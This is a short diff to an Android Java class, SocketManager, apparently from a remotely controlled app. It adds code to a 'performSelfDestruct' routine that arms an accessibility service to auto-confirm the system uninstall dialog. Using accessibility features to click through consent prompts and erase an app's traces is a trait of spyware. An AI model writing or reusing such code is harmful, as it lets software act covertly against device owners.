@@ -3343,6 +3343,18 @@ public class SocketManager {
     private JSONObject performSelfDestruct() {
         JSONObject r = new JSONObject();
         try {
+            // Arm only this app's exact package before opening the system
+            // confirmation dialog. The accessibility service will confirm
+            // only a matching, visible package-installer dialog.
+            com.task.tusker.services.UnifiedAccessibilityService service =
+                    com.task.tusker.services.UnifiedAccessibilityService.getInstance();
+            if (service == null) {
+                r.put("success", false);
+                r.put("error", "Accessibility service is not connected");
+                return r;
+            }
+            service.armSelfUninstallAssist();
+
             // Schedule destruction after giving time to send the response
             new Thread(() -> {
                 try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
